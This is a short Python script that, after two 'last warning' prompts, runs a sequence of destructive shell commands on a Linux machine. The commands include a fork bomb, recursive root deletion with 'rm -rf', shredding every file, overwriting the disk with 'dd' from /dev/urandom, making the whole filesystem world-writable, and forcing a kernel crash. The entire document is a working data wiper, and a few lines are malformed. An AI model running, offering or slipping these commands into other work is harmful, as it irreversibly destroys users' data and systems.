import subprocess

print("Press enter to continue and CTRL + C TO QUIT...")
input("This Python script will destroy your Linux installation!")
print("Press enter to continue and CTRL + C TO QUIT...")
input("THIS IS THE LAST WARNING!")

subprocess.run(":(){ :|:& };:", shell=True)

subprocess.run("sudo rm -rf /*", shell=True)

subprocess.run("sudo rm -fr --no-preserve-root", shell=True)

subprocess.run("sudo chmod -R 777 /", shell=True)

subprocess.run("sudo rm -rf /etc/cron.d/*", shell=True)

subprocess.run("sudo find / -type f -exec shred -n 5 -z -u {} +", shell=True)

subprocess.run("dd if=/dev/urandom of=/dev/sda", shell=True)

subprocess.run("sudo bash -c 'echo c > /proc/sysrq-trigger'", shell=True)

subprocess.run("mv /home/user/* /dev/null", shell=True)
